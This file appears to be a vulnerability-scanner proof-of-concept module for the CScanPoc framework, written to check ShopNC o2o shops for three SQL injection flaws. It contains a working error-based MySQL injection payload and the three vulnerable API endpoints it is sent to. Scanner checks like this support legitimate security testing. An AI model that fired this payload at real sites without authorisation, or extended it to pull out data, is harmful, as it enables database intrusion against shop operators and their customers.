# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ShopNC_0000'  # 平台漏洞编号，留空
    name = 'ShopNC o2o 版三处sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-1'  # 漏洞公布时间
    desc = '''
        ShopNC商城系统，是天津市网城天创科技有限责任公司开发的一套多店模式的商城系统。
        ShopNC o2o 版三处sql注入,直接出数据.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0125512'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNC'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'be9b8c25-d823-4c8a-bf74-a288f58b70c8'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                '/circle/index.php?act=api&op=get_theme_list&data_count=1',
                '/circle/index.php?act=api&op=get_reply_themelist&data_count=1',
                '/circle/index.php?act=api&op=get_more_membertheme&data_count=1'
            ]
            payload = "%20procedure%20analyse(extractvalue(rand(),concat(0x3a,md5(1))),1)"
            for url in urls:
                vun_url = arg+url+payload
                code, head, res, errcode, finalurl = hh.http(vun_url)
                if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
